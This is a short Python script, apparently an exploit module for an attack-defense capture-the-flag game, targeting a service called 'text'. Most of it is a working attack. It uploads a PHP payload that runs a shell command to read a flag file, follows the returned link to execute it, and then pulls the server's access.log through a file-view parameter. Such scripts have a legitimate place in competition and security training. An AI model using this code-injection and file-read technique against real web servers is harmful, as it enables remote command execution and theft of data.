from exploit_base import Exploit
import requests

class Exploit_Text(Exploit):
	def __init__(self):
		self.service_name = "text"
		self.port_number = 20093
	
	def exploit(self, ip, port, flag_id):
		print "Exploit text: IP: "+ip+" @Port: "+port+" -- Flag_ID: "+ flag_id
                r = requests.get('http://' + ip + ':' + port + '/uploadFile.php?text=' + '<?php system("cat `ls -t ../rw/' + flag_id + '_*|head -n1`");?>')
                print r.text
                follow = r.text.split('href = "')[1]
                follow = follow.split('"')[0]
                r = requests.get('http://' + ip + ':' + port + '/' + follow)
                print r.text #should be flag
                r = requests.get('http://' + ip + ':' + port + '/viewFile.php?file=access.log')
                print 'getting logs'
                return r.text
